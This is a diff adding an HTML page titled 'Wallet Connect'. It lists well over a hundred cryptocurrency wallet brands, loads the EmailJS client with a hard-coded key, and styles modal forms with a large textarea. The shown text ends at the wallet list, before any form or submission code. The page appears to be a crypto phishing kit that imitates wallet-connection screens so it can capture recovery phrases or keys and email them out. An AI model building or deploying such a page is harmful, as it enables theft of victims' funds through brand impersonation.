@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Wallet Connect </title>
+
+<!-- EmailJS client -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  (function(){ emailjs.init("ShwzJXDiCULktjLAz"); })();
+</script>
+
+<style>
+:root{
+  --bg:#070816; --card:#0f1220; --text:#eef3ff; --muted:#9aa3c7;
+  --neon:#4da3ff; --neon-2:#8a66ff;
+}
+
+*{box-sizing:border-box;}
+body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;background:linear-gradient(180deg,#03040a,#071026);color:var(--text);padding:28px;}
+.container{max-width:2500px;margin:0 auto}
+h1{margin:0;font-size:22px;}
+p.lead{margin:0;color:var(--muted);font-size:13px;}
+.card{background:linear-gradient(180deg,#0c1324,#071025);border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.04);}
+.search{display:flex;gap:10px;align-items:center;margin:14px 0;}
+.search input{flex:1;height:44px;padding:10px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:#071025;color:var(--text);}
+.walletGrid{display:grid;gap:12px;grid-template-columns:repeat(4,1fr);}.walletItem{display:flex;align-items:center;gap:12px;padding:12px;border-radius:12px;background:linear-gradient(180deg,#071025,#061021);border:1px solid rgba(255,255,255,0.03);cursor:pointer;min-height:56px;transition:all .12s;}.walletItem:hover{transform:translateY(-4px);box-shadow:0 10px 30px rgba(77,163,255,0.06);border-color:rgba(77,163,255,0.14);}
+.walletLogo img{width:40px;height:40px;object-fit:contain;border-radius:8px;}.walletName{font-weight:700;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#fff;}
+.overlay{position:fixed;inset:0;background:rgba(1,4,10,0.72);display:none;align-items:center;justify-content:center;z-index:300;}
+.overlay.active{display:flex;}
+.modal{width:92%;max-width:520px;border-radius:14px;padding:16px;background:linear-gradient(180deg,#061022,#05101b);border:1px solid rgba(124,89,255,0.06);}
+.modalHeader{display:flex;justify-content:space-between;align-items:center;gap:8px;}
+.modalTitle{font-weight:900;font-size:18px;}
+.modalClose{background:transparent;border:none;color:var(--muted);font-size:22px;cursor:pointer;}
+.modalBody{margin-top:12px;display:flex;flex-direction:column;gap:12px;}
+.pulseWrap{display:grid;place-items:center;min-height:120px;}
+.pulse{position:relative;width:84px;height:84px;}
+.pulse .ring{position:absolute;border-radius:50%;border:3px solid rgba(77,163,255,0.12);opacity:0;transform:scale(.8);animation:arc 1.6s infinite;}
+.pulse .ring.r1{width:22px;height:22px;top:31px;left:31px;animation-delay:0;}
+.pulse .ring.r2{width:40px;height:40px;top:22px;left:22px;animation-delay:.16s;}
+.pulse .ring.r3{width:58px;height:58px;top:13px;left:13px;animation-delay:.32s;}
+.pulse .core{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:14px;height:14px;border-radius:50%;background:linear-gradient(135deg,#7ec0ff,#4da3ff,#8a66ff);box-shadow:0 0 16px rgba(77,163,255,0.24);}
+@keyframes arc{0%{opacity:0;transform:scale(.8)}40%{opacity:1;transform:scale(1)}100%{opacity:0;transform:scale(1.2)}}
+.statusText{text-align:center;color:#cdd9ff;font-weight:700;}
+.actions{display:flex;gap:10px;justify-content:center;margin-top:6px;}
+.btn{padding:10px 14px;border-radius:10px;border:none;font-weight:800;cursor:pointer;}
+.btnPrimary{background:linear-gradient(90deg,var(--neon),var(--neon-2));color:#031018;}
+.btnGhost{background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.04);}
+.methodTabs{display:flex;flex-direction:column;gap:8px;justify-content:flex-start;margin-top:6px;}
+.methodTab{padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);text-align:center;font-weight:800;cursor:pointer;border:1px solid rgba(255,255,255,0.02);}
+.methodTab.active{background:linear-gradient(90deg,var(--neon),var(--neon-2));color:#041026;border-color:transparent;}
+.formWrap{display:none;flex-direction:column;gap:8px;padding:12px;border-radius:10px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);}
+.formWrap.active{display:flex;}
+.label{font-size:12px;color:#9fb1ff;font-weight:700;}
+.textarea{min-height:160px;padding:12px;border-radius:10px;border:none;background:#071025;color:var(--text);outline:none;}
+.input{height:44px;padding:10px;border-radius:10px;border:none;background:#071025;color:var(--text);}
+.submitRow{display:flex;gap:8px;justify-content:flex-end;margin-top:6px;}
+.note{font-size:12px;color:var(--muted);text-align:center;}
+/* Toast */
+#toast{
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%) scale(0.9);
+  background:linear-gradient(135deg,var(--neon),var(--neon-2));
+  color:#031018;
+  padding:14px 24px;
+  border-radius:12px;
+  font-weight:700;
+  font-size:14px;
+  opacity:0;
+  z-index:500;
+  display:none;
+  box-shadow:0 0 20px rgba(77,163,255,0.3);
+  transition:opacity 0.5s, transform 0.5s;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Select Wallet</h1>
+  <p class="lead"><strong>Select from available wallets below</strong></p>
+  <div class="card">
+    <div class="search">
+      <input id="search" type="text" placeholder="Search wallets…"/>
+    </div>
+    <div id="walletGrid" class="walletGrid">
+ <!-- Example wallets -->
+ 
+
+
+<div class="walletItem" data-name="Coinbase"><div class="walletLogo"><img src="ICON/coinbase.png" alt="Coinbase Wallet Logo"></div><div class="walletName">Coinbase</div></div>
+
+<div class="walletItem" data-name="WalletConnect"><div class="walletLogo"><img src="ICON/walletconnect.png" alt="walletconnect Wallet Logo"></div><div class="walletName">WalletConnect</div></div>
+
+
+
+<div class="walletItem" data-name="Avalanche"><div class="walletLogo"><img src="ICON/avalanche.png" alt="Avalanche Wallet Logo"></div><div class="walletName">Avalanche</div></div>
+
+<div class="walletItem" data-name="OKXwallet"><div class="walletLogo"><img src="ICON/okx.png" alt="OKX Wallet Logo"></div><div class="walletName">OKX</div></div>
+<div class="walletItem" data-name="BybitWEB3"><div class="walletLogo"><img src="ICON/bybitweb3.png" alt="BybitWEB3 Wallet Logo"></div><div class="walletName">BybitWEB3</div></div>
+<div class="walletItem" data-name="Xumm"><div class="walletLogo"><img src="ICON/xum.jpeg"alt="Xumm Wallet Logo"></div><div class="walletName">Xumm</div></div>
+<div class="walletItem" data-name="Eluvio"><div class="walletLogo"><img src="ICON/eluvio.jpeg" alt="Eluvio Wallet Logo"></div><div class="walletName">Eluvio</div></div>
+<div class="walletItem" data-name="ZenGo"><div class="walletLogo"><img src="ICON/zengo.jpeg" alt="ZenGo Wallet Logo"></div><div class="walletName">ZenGo</div></div>
+<div class="walletItem" data-name="Ronin"><div class="walletLogo"><img src="ICON/ronin.jpeg" alt="Ronin Wallet Logo"></div><div class="walletName">Ronin</div></div>
+<div class="walletItem" data-name="Ledger"><div class="walletLogo"><img src="ICON/ledger.jpg" alt="Ledger Wallet Logo"></div><div class="walletName">Ledger</div></div>
+<div class="walletItem" data-name="TokenProof"><div class="walletLogo"><img src="ICON/tokenproof.png" alt="BybitWEB3 Wallet Logo"></div><div class="walletName">TokenProof</div></div>
+
+<div class="walletItem" data-name="Blocto"><div class="walletLogo"><img src="ICON/blocto.png" alt="Blocto Wallet Logo"></div><div class="walletName">Blocto</div></div>
+<div class="walletItem" data-name="Dapper"><div class="walletLogo"><img src="ICON/dapper.jpeg" alt="Dapper Wallet Logo"></div><div class="walletName">Dapper</div></div>
+
+
+
+<div class="walletItem" data-name="Litecoin"><div class="walletLogo"><img src="ICON/download%20(2).jpeg" alt="Litecoin Wallet Logo"></div><div class="walletName">Litecoin</div></div>
+<div class="walletItem" data-name="Cosmos"><div class="walletLogo"><img src="ICON/cosmos.jpg" alt="Cosmos Wallet Logo"></div><div class="walletName">Cosmos</div></div>
+<div class="walletItem" data-name="Bitski"><div class="walletLogo"><img src="ICON/bitski.png" alt="Bitski Wallet Logo"></div><div class="walletName">Bitski</div></div>
+<div class="walletItem" data-name="CCVault"><div class="walletLogo"><img src="ICON/ccvault.png" alt="CCVault Wallet Logo"></div><div class="walletName">CCVault</div></div>
+<div class="walletItem" data-name="MetaMask"><div class="walletLogo"><img src="ICON/download%20(11).png" alt="MetaMask Wallet Logo"></div><div class="walletName">MetaMask</div></div>
+<div class="walletItem" data-name="Algorand"><div class="walletLogo"><img src="ICON/algorand.png" alt="Algorand Wallet Logo"></div><div class="walletName">Algorand</div></div>
+<div class="walletItem" data-name="Trust Wallet"><div class="walletLogo"><img src="ICON/trustwallet.png" alt="Trust Wallet"></div><div class="walletName">Trust Wallet</div></div>
+<div class="walletItem" data-name="Kelplr"><div class="walletLogo"><img src="ICON/kelplr.png" alt="Kelplr"></div><div class="walletName">Kelplr</div></div>
+<div class="walletItem" data-name="Ledger"><div class="walletLogo"><img src="ICON/ledger.jpg" alt="Ledger"></div><div class="walletName">Ledger</div></div>
+<div class="walletItem" data-name="Safe Pal"><div class="walletLogo"><img src="ICON/safepal.png" alt="Safe Pal"></div><div class="walletName">Safe Pal</div></div>
+<div class="walletItem" data-name="TronLink"><div class="walletLogo"><img src="ICON/tronlink.png" alt="TronLink"></div><div class="walletName">TronLink</div></div>
+<div class="walletItem" data-name="Rabby"><div class="walletLogo"><img src="ICON/rabby.png" alt="Rabby"></div><div class="walletName">Rabby</div></div>
+<div class="walletItem" data-name="Petra"><div class="walletLogo"><img src="ICON/petra.png" alt="Petra"></div><div class="walletName">Petra</div></div>
+<div class="walletItem" data-name="Sui"><div class="walletLogo"><img src="ICON/sui.png" alt="Sui"></div><div class="walletName">Sui</div></div>
+<div class="walletItem" data-name="Defichain"><div class="walletLogo"><img src="ICON/defichain.png" alt="Defichain"></div><div class="walletName">Defichain</div></div>
+<div class="walletItem" data-name="DFX"><div class="walletLogo"><img src="ICON/dfx.png" alt="DFX"></div><div class="walletName">DFX</div></div>
+<div class="walletItem" data-name="Phantom"><div class="walletLogo"><img src="ICON/phantom.png" alt="Phantom"></div><div class="walletName">Phantom</div></div>
+<div class="walletItem" data-name="Solana"><div class="walletLogo"><img src="ICON/solana.png" alt="Solana"></div><div class="walletName">Solana</div></div>
+<div class="walletItem" data-name="Blockchain"><div class="walletLogo"><img src="ICON/blockchain.png" alt="Blockchain"></div><div class="walletName">Blockchain</div></div>
+<div class="walletItem" data-name="Lobstr"><div class="walletLogo"><img src="ICON/lobstr.png" alt="Lobstr"></div><div class="walletName">Lobstr</div></div>
+<div class="walletItem" data-name="Yoroi"><div class="walletLogo"><img src="ICON/yoroi.png" alt="Yoroi"></div><div class="walletName">Yoroi</div></div>
+<div class="walletItem" data-name="Coinomi"><div class="walletLogo"><img src="ICON/coinomi.png" alt="Coinomi"></div><div class="walletName">Coinomi</div></div>
+<div class="walletItem" data-name="Edge"><div class="walletLogo"><img src="ICON/edge.png" alt="Edge"></div><div class="walletName">Edge</div></div>
+<div class="walletItem" data-name="Solar"><div class="walletLogo"><img src="ICON/solar.png" alt="Solar"></div><div class="walletName">Solar</div></div>
+<div class="walletItem" data-name="Leap"><div class="walletLogo"><img src="ICON/leap.avif" alt="Leap"></div><div class="walletName">Leap</div></div>
+<div class="walletItem" data-name="Talisman"><div class="walletLogo"><img src="ICON/talisman.png" alt="Talisman"></div><div class="walletName">Talisman</div></div>
+<div class="walletItem" data-name="Neoline"><div class="walletLogo"><img src="ICON/neoline.png" alt="Neoline"></div><div class="walletName">Neoline</div></div>
+<div class="walletItem" data-name="Polkadot"><div class="walletLogo"><img src="ICON/polkadot.png" alt="Polkadot"></div><div class="walletName">Polkadot</div></div>
+<div class="walletItem" data-name="Peraalgo"><div class="walletLogo"><img src="ICON/peraalgo.png" alt="Peraalgo"></div><div class="walletName">Peraalgo</div></div>
+<div class="walletItem" data-name="Sender"><div class="walletLogo"><img src="ICON/sender.png" alt="Sender"></div><div class="walletName">Sender</div></div>
+<div class="walletItem" data-name="XcelPay"><div class="walletLogo"><img src="ICON/xcelpay.png" alt="XcelPay"></div><div class="walletName">XcelPay</div></div>
+<div class="walletItem" data-name="Anchor"><div class="walletLogo"><img src="ICON/anchor.png" alt="Anchor"></div><div class="walletName">Anchor</div></div>
+<div class="walletItem" data-name="Onto"><div class="walletLogo"><img src="ICON/onto.png" alt="Onto"></div><div class="walletName">Onto</div></div>
+<div class="walletItem" data-name="Rainbow"><div class="walletLogo"><img src="ICON/rainbow.png" alt="Rainbow"></div><div class="walletName">Rainbow</div></div>
+<div class="walletItem" data-name="Argent"><div class="walletLogo"><img src="ICON/argent.png" alt="Argent"></div><div class="walletName">Argent</div></div>
+<div class="walletItem" data-name="Cybavo"><div class="walletLogo"><img src="ICON/cybavo.jpg" alt="Cybavo"></div><div class="walletName">Cybavo</div></div>
+<div class="walletItem" data-name="GridPlus"><div class="walletLogo"><img src="ICON/gridplus.png" alt="GridPlus"></div><div class="walletName">GridPlus</div></div>
+<div class="walletItem" data-name="imToken"><div class="walletLogo"><img src="ICON/imtoken.png" alt="imToken"></div><div class="walletName">imToken</div></div>
+<div class="walletItem" data-name="Pillar"><div class="walletLogo"><img src="ICON/pillar.jpg" alt="Pillar"></div><div class="walletName">Pillar</div></div>
+<div class="walletItem" data-name="Cryptoo"><div class="walletLogo"><img src="ICON/cryptoo.jpg" alt="Cryptoo"></div><div class="walletName">Cryptoo</div></div>
+<div class="walletItem" data-name="Gnosis"><div class="walletLogo"><img src="ICON/gnosis.jpg" alt="Gnosis"></div><div class="walletName">Gnosis</div></div>
+<div class="walletItem" data-name="TokenPocket"><div class="walletLogo"><img src="ICON/tokenpocket.png" alt="TokenPocket"></div><div class="walletName">TokenPocket</div></div>
+<div class="walletItem" data-name="Authereum"><div class="walletLogo"><img src="ICON/authereum.png" alt="Authereum"></div><div class="walletName">Authereum</div></div>
+<div class="walletItem" data-name="Huobi"><div class="walletLogo"><img src="ICON/huobi.jpg" alt="Huobi"></div><div class="walletName">Huobi</div></div>
+<div class="walletItem" data-name="TrustVault"><div class="walletLogo"><img src="ICON/trustvault.jpg" alt="TrustVault"></div><div class="walletName">TrustVault</div></div>
+<div class="walletItem" data-name="CurveFinance"><div class="walletLogo"><img src="ICON/curvefinance.jpg" alt="CurveFinance"></div><div class="walletName">CurveFinance</div></div>
+<div class="walletItem" data-name="BitPay"><div class="walletLogo"><img src="ICON/bitpay.jpg" alt="BitPay"></div><div class="walletName">BitPay</div></div>
+<div class="walletItem" data-name="Dharma"><div class="walletLogo"><img src="ICON/dharma.jpg" alt="Dharma"></div><div class="walletName">Dharma</div></div>
+<div class="walletItem" data-name="MyKey"><div class="walletLogo"><img src="ICON/mykey.png" alt="MyKey"></div><div class="walletName">MyKey</div></div>
+<div class="walletItem" data-name="Atomic"><div class="walletLogo"><img src="ICON/atomic.png" alt="Atomic"></div><div class="walletName">Atomic</div></div>
+<div class="walletItem" data-name="ZkSync"><div class="walletLogo"><img src="ICON/zksync.png" alt="ZkSync"></div><div class="walletName">ZkSync</div></div>
+<div class="walletItem" data-name="Shell"><div class="walletLogo"><img src="ICON/shell.jpg" alt="Shell"></div><div class="walletName">Shell</div></div>
+<div class="walletItem" data-name="Index"><div class="walletLogo"><img src="ICON/index.png" alt="Index"></div><div class="walletName">Index</div></div>
+<div class="walletItem" data-name="SwapX"><div class="walletLogo"><img src="ICON/swapx.jpg" alt="SwapX"></div><div class="walletName">SwapX</div></div>
+<div class="walletItem" data-name="Starname"><div class="walletLogo"><img src="ICON/starname.jpg" alt="Starname"></div><div class="walletName">Starname</div></div>
+<div class="walletItem" data-name="Mask"><div class="walletLogo"><img src="ICON/mask.png" alt="Mask"></div><div class="walletName">Mask</div></div>
+<div class="walletItem" data-name="Ankr"><div class="walletLogo"><img src="ICON/ankr.png" alt="Ankr"></div><div class="walletName">Ankr</div></div>
+<div class="walletItem" data-name="Dodo"><div class="walletLogo"><img src="ICON/dodo.png" alt="Dodo"></div><div class="walletName">Dodo</div></div>
+<div class="walletItem" data-name="Zlot"><div class="walletLogo"><img src="ICON/zlot.png" alt="Zlot"></div><div class="walletName">Zlot</div></div>
+<div class="walletItem" data-name="Matt"><div class="walletLogo"><img src="ICON/matt.jpg" alt="Matt"></div><div class="walletName">Matt</div></div>
+<div class="walletItem" data-name="Walleth"><div class="walletLogo"><img src="ICON/walleth.jpg" alt="Walleth"></div><div class="walletName">Walleth</div></div>
+<div class="walletItem" data-name="Coin98"><div class="walletLogo"><img src="ICON/coin98.png" alt="Coin98"></div><div class="walletName">Coin98</div></div>
+<div class="walletItem" data-name="1inch"><div class="walletLogo"><img src="ICON/1inch.png" alt="1inch"></div><div class="walletName">1inch</div></div>
+<div class="walletItem" data-name="Eidoo"><div class="walletLogo"><img src="ICON/eidoo.jpg" alt="Eidoo"></div><div class="walletName">Eidoo</div></div>
+<div class="walletItem" data-name="Tokamak"><div class="walletLogo"><img src="ICON/tokamak.png" alt="Tokamak"></div><div class="walletName">Tokamak</div></div>
+<div class="walletItem" data-name="AstroTools"><div class="walletLogo"><img src="ICON/astrotools.jpg" alt="AstroTools"></div><div class="walletName">AstroTools</div></div>
+<div class="walletItem" data-name="Rubic"><div class="walletLogo"><img src="ICON/rubic.jpg" alt="Rubic"></div><div class="walletName">Rubic</div></div>
+<div class="walletItem" data-name="Torus"><div class="walletLogo"><img src="ICON/torus.jpg" alt="Torus"></div><div class="walletName">Torus</div></div>
+<div class="walletItem" data-name="OceanProtocol"><div class="walletLogo"><img src="ICON/oceanProtocol.jpg" alt="OceanProtocol"></div><div class="walletName">OceanProtocol</div></div>
+<div class="walletItem" data-name="One"><div class="walletLogo"><img src="ICON/one.png" alt="One"></div><div class="walletName">One</div></div>
+<div class="walletItem" data-name="Falcon Swap"><div class="walletLogo"><img src="ICON/falconswap.png" alt="Falcon Swap"></div><div class="walletName">Falcon Swap</div></div>
+<div class="walletItem" data-name="Bancor"><div class="walletLogo"><img src="ICON/bancor.png" alt="Bancor"></div><div class="walletName">Bancor</div></div>
+<div class="walletItem" data-name="Harvest"><div class="walletLogo"><img src="ICON/harvest.png" alt="Harvest"></div><div class="walletName">Harvest</div></div>
+<div class="walletItem" data-name="OctoFi"><div class="walletLogo"><img src="ICON/octofi.jpg" alt="OctoFi"></div><div class="walletName">OctoFi</div></div>
+<div class="walletItem" data-name="Mushroom"><div class="walletLogo"><img src="ICON/mushroom.jpg" alt="Mushroom"></div><div class="walletName">Mushroom</div></div>
+<div class="walletItem" data-name="Bittfrost"><div class="walletLogo"><img src="ICON/bittfrost.jpg" alt="Bittfrost"></div><div class="walletName">Bittfrost</div></div>
+<div class="walletItem" data-name="Orchid"><div class="walletLogo"><img src="ICON/orchid.png" alt="Orchid"></div><div class="walletName">Orchid</div></div>
+<div class="walletItem" data-name="Datamine"><div class="walletLogo"><img src="ICON/datamine.jpg" alt="Datamine"></div><div class="walletName">Datamine</div></div>
+<div class="walletItem" data-name="Streamr"><div class="walletLogo"><img src="ICON/streamr.png" alt="Streamr"></div><div class="walletName">Streamr</div></div>
+<div class="walletItem" data-name="DappRader"><div class="walletLogo"><img src="ICON/dapprader.jpg" alt="DappRader"></div><div class="walletName">DappRader</div></div>
+<div class="walletItem" data-name="Solflare"><div class="walletLogo"><img src="ICON/solflare.jpg" alt="Solflare"></div><div class="walletName">Solflare</div></div>
+<div class="walletItem" data-name="Arbitrum"><div class="walletLogo"><img src="ICON/arbitrum.png" alt="Arbitrum"></div><div class="walletName">Arbitrum</div></div>
+<div class="walletItem" data-name="Paraswap"><div class="walletLogo"><img src="ICON/paraswap.jpg" alt="Paraswap"></div><div class="walletName">Paraswap</div></div>
+<div class="walletItem" data-name="Honey"><div class="walletLogo"><img src="ICON/honey.jpg" alt="Honey"></div><div class="walletName">Honey</div></div>
+<div class="walletItem" data-name="Fleek"><div class="walletLogo"><img src="ICON/fleek.jpg" alt="Fleek"></div><div class="walletName">Fleek</div></div>
+<div class="walletItem" data-name="CoolWallet"><div class="walletLogo"><img src="ICON/coolwallet.png" alt="CoolWallet"></div><div class="walletName">CoolWallet</div></div>
+<div class="walletItem" data-name="Alice"><div class="walletLogo"><img src="ICON/alice.png" alt="Alice"></div><div class="walletName">Alice</div></div>
+<div class="walletItem" data-name="Alpha"><div class="walletLogo"><img src="ICON/alpha.png" alt="Alpha"></div><div class="walletName">Alpha</div></div>
+<div class="walletItem" data-name="Zelcare"><div class="walletLogo"><img src="ICON/zelcare.png" alt="Zelcare"></div><div class="walletName">Zelcare</div></div>
+<div class="walletItem" data-name="Tokenary"><div class="walletLogo"><img src="ICON/tokenary.png" alt="Tokenary"></div><div class="walletName">Tokenary</div></div>
+<div class="walletItem" data-name="Sollet"><div class="walletLogo"><img src="ICON/sollet.jpg" alt="Sollet"></div><div class="walletName">Sollet</div></div>
+<div class="walletItem" data-name="Spatium"><div class="walletLogo"><img src="ICON/spatium.png" alt="Spatium"></div><div class="walletName">Spatium</div></div>
+<div class="walletItem" data-name="Infinito"><div class="walletLogo"><img src="ICON/infinito.png" alt="Infinito"></div><div class="walletName">Infinito</div></div>
+<div class="walletItem" data-name="Wallet.io"><div class="walletLogo"><img src="ICON/wallet.jpg" alt="Wallet.io"></div><div class="walletName">Wallet.io</div></div>
+<div class="walletItem" data-name="InfinityWallet"><div class="walletLogo"><img src="ICON/infinitywallet.jpg" alt="InfinityWallet"></div><div class="walletName">InfinityWallet</div></div>
+<div class="walletItem" data-name="Owbit"><div class="walletLogo"><img src="ICON/owbit.jpg" alt="Owbit"></div><div class="walletName">Owbit</div></div>
+<div class="walletItem" data-name="EasyPocket"><div class="walletLogo"><img src="ICON/easypocket.png" alt="EasyPocket"></div><div class="walletName">EasyPocket</div></div>
+<div class="walletItem" data-name="Bridge"><div class="walletLogo"><img src="ICON/bridge.png" alt="Bridge"></div><div class="walletName">Bridge</div></div>
+<div class="walletItem" data-name="Unstoppable"><div class="walletLogo"><img src="ICON/unstoppable.jpg" alt="Unstoppable"></div><div class="walletName">Unstoppable</div></div>
+<div class="walletItem" data-name="PeakDeFi"><div class="walletLogo"><img src="ICON/peakdefi.jpg" alt="PeakDeFi"></div><div class="walletName">PeakDeFi</div></div>
+<div class="walletItem" data-name="Vision"><div class="walletLogo"><img src="ICON/vision.jpg" alt="Vision"></div><div class="walletName">Vision</div></div>
+<div class="walletItem" data-name="BitKeep"><div class="walletLogo"><img src="ICON/bitkeep.png" alt="BitKeep"></div><div class="walletName">BitKeep</div></div>
+<div class="walletItem" data-name="ViaWallet"><div class="walletLogo"><img src="ICON/viawallet.png" alt="ViaWallet"></div><div class="walletName">ViaWallet</div></div>
+<div class="walletItem" data-name="SparkPoint"><div class="walletLogo"><img src="ICON/sparkpoint.jpg" alt="SparkPoint"></div><div class="walletName">SparkPoint</div></div>
+<div class="walletItem" data-name="DOK"><div class="walletLogo"><img src="ICON/dok.jpg" alt="DOK"></div><div class="walletName">DOK</div></div>
+<div class="walletItem" data-name="AtWallet"><div class="walletLogo"><img src="ICON/atwallet.png" alt="AtWallet"></div><div class="walletName">AtWallet</div></div>
+<div class="walletItem" data-name="Midas"><div class="walletLogo"><img src="ICON/midas.png" alt="Midas"></div><div class="walletName">Midas</div></div>
+<div class="walletItem" data-name="Ellipal"><div class="walletLogo"><img src="ICON/ellipal.png" alt="Ellipal"></div><div class="walletName">Ellipal</div></div>
+<div class="walletItem" data-name="Keyring"><div class="walletLogo"><img src="ICON/keyring.png" alt="Keyring"></div><div class="walletName">Keyring</div></div>
+<div class="walletItem" data-name="Talken"><div class="walletLogo"><img src="ICON/talken.jpg" alt="Talken"></div><div class="walletName">Talken</div></div>
+<div class="walletItem" data-name="XinFin"><div class="walletLogo"><img src="ICON/xinfin.png" alt="XinFin"></div><div class="walletName">XinFin</div></div>
+<div class="walletItem" data-name="Flare"><div class="walletLogo"><img src="ICON/flare.png" alt="Flare"></div><div class="walletName">Flare</div></div>
+<div class="walletItem" data-name="AToken"><div class="walletLogo"><img src="ICON/atoken.jpg" alt="AToken"></div><div class="walletName">AToken</div></div>
+<div class="walletItem" data-name="Tongue"><div class="walletLogo"><img src="ICON/tongue.jpg" alt="Tongue"></div><div class="walletName">Tongue</div></div>
+<div class="walletItem" data-name="BinanceDEX"><div class="walletLogo"><img src="ICON/binanceDEX.jpg" alt="BinanceDEX"></div><div class="walletName">BinanceDEX</div></div>
+<div class="walletItem" data-name="Plasma"><div class="walletLogo"><img src="ICON/plasma.jpg" alt="Plasma"></div><div class="walletName">Plasma</div></div>
+<div class="walletItem" data-name="03Wallet"><div class="walletLogo"><img src="ICON/03wallet.jpg" alt="03Wallet"></div><div class="walletName">03Wallet</div></div>
+<div class="walletItem" data-name="HashKey"><div class="walletLogo"><img src="ICON/hashkey.jpg" alt="HashKey"></div><div class="walletName">HashKey</div></div>
+<div class="walletItem" data-name="Guarda"><div class="walletLogo"><img src="ICON/guarda.jpg" alt="Guarda"></div><div class="walletName">Guarda</div></div>
+<div class="walletItem" data-name="Defiant"><div class="walletLogo"><img src="ICON/defiant.jpg" alt="Defiant"></div><div class="walletName">Defiant</div></div>
+<div class="walletItem" data-name="Trustee"><div class="walletLogo"><img src="ICON/trustee.png" alt="Trustee"></div><div class="walletName">Trustee</div></div>
+<div class="walletItem" data-name="MeetOne"><div class="walletLogo"><img src="ICON/meetone.jpg" alt="MeetOne"></div><div class="walletName">MeetOne</div></div>
+<div class="walletItem" data-name="Morix"><div class="walletLogo"><img src="ICON/morix.png" alt="Morix"></div><div class="walletName">Morix</div></div>
+<div class="walletItem" data-name="BinanceSmartChain"><div class="walletLogo"><img src="ICON/binancesmartchain.png" alt="BinanceSmartChain"></div><div class="walletName">BinanceSmartChain</div></div>
+<div class="walletItem" data-name="Etherscan"><div class="walletLogo"><img src="ICON/etherscan.png" alt="Etherscan"></div><div class="walletName">Etherscan</div></div>
+<div class="walletItem" data-name="Lido"><div class="walletLogo"><img src="ICON/lido.jpg" alt="Lido"></div><div class="walletName">Lido</div></div>
+<div class="walletItem" data-name="TerraStation"><div class="walletLogo"><img src="ICON/terrastation.jpg" alt="TerraStation"></div><div class="walletName">TerraStation</div></div>
+<div class="walletItem" data-name="OpenSea"><div class="walletLogo"><img src="ICON/opensea.png" alt="OpenSea"></div><div class="walletName">OpenSea</div></div>
+<div class="walletItem" data-name="Zapper"><div class="walletLogo"><img src="ICON/zapper.jpg" alt="Zapper"></div><div class="walletName">Zapper</div></div>
+<div class="walletItem" data-name="Aave"><div class="walletLogo"><img src="ICON/aave.jpg" alt="Aave"></div><div class="walletName">Aave</div></div>
+<div class="walletItem" data-name="Zerion"><div class="walletLogo"><img src="ICON/zerion.png" alt="Zerion"></div><div class="walletName">Zerion</div></div>
+<div class="walletItem" data-name="LovalCryptos"><div class="walletLogo"><img src="ICON/localcryptos.jpg" alt="LovalCryptos"></div><div class="walletName">LovalCryptos</div></div>
+<div class="walletItem" data-name="DeBank"><div class="walletLogo"><img src="ICON/debank.png" alt="DeBank"></div><div class="walletName">DeBank</div></div>
+<div class="walletItem" data-name="D'GENT wallet"><div class="walletLogo"><img src="ICON/d'gent.png" alt="D'GENT Wallet"></div><div class="walletName">D'GENT Wallet</div></div>
+<div class="walletItem" data-name="UnstoppableDomains"><div class="walletLogo"><img src="ICON/unstoppabledomains.png" alt="UnstoppableDomains"></div><div class="walletName">UnstoppableDomains</div></div>
+<div class="walletItem" data-name="Rarible"><div class="walletLogo"><img src="ICON/rarible.png" alt="Rarible"></div><div class="walletName">Rarible</div></div>
+<div class="walletItem" data-name="Yearn"><div class="walletLogo"><img src="ICON/yearn.jpg" alt="Yearn"></div><div class="walletName">Yearn</div></div>
+<div class="walletItem" data-name="AdExNetwork"><div class="walletLogo"><img src="ICON/adexnetwork.png" alt="AdExNetwork"></div><div class="walletName">AdExNetwork</div></div>
+<div class="walletItem" data-name="DyDx"><div class="walletLogo"><img src="ICON/dydx.png" alt="DyDx"></div><div class="walletName">DyDx</div></div>
+<div class="walletItem" data-name="MyCrypto"><div class="walletLogo"><img src="ICON/mycrypto.png" alt="MyCrypto"></div><div class="walletName">MyCrypto</div></div>
+<div class="walletItem" data-name="Oasis"><div class="walletLogo"><img src="ICON/oasis.png" alt="Oasis"></div><div class="walletName">Oasis</div></div>
+<div class="walletItem" data-name="TokenSet"><div class="walletLogo"><img src="ICON/tokenset.jpg" alt="TokenSet"></div><div class="walletName">TokenSet</div></div>
+<div class="walletItem" data-name="MandraDAO"><div class="walletLogo"><img src="ICON/mantra dao.jpg" alt="MandraDAO"></div><div class="walletName">MandraDAO</div></div>
+<div class="walletItem" data-name="Matcha"><div class="walletLogo"><img src="ICON/matcha.png" alt="Matcha"></div><div class="walletName">Matcha</div></div>
+<div class="walletItem" data-name="KyberSwap"><div class="walletLogo"><img src="ICON/kyberswap.png" alt="KyberSwap"></div><div class="walletName">KyberSwap</div></div>
+<div class="walletItem" data-name="DeFiPortfolio"><div class="walletLogo"><img src="ICON/defiportfolio.png" alt="DeFiPortfolio"></div><div class="walletName">DeFiPortfolio</div></div>
+<div class="walletItem" data-name="Loopring"><div class="walletLogo"><img src="ICON/loopring.jpg" alt="Loopring"></div><div class="walletName">Loopring</div></div>
+<div class="walletItem" data-name="InstaDApp"><div class="walletLogo"><img src="ICON/instadapp.jpg" alt="InstaDApp"></div><div class="walletName">InstaDApp</div></div>
+<div class="walletItem" data-name="MaticNetwork"><div class="walletLogo"><img src="ICON/matic network.jpg" alt="MaticNetwork"></div><div class="walletName">Matic Network</div></div>
+<div class="walletItem" data-name="DDex"><div class="walletLogo"><img src="ICON/ddex.png" alt="DDex"></div><div class="walletName">DDex</div></div>
+<div class="walletItem" data-name="Bamboo"><div class="walletLogo"><img src="ICON/bamboo.png" alt="Bamboo"></div><div class="walletName">Bamboo</div></div>
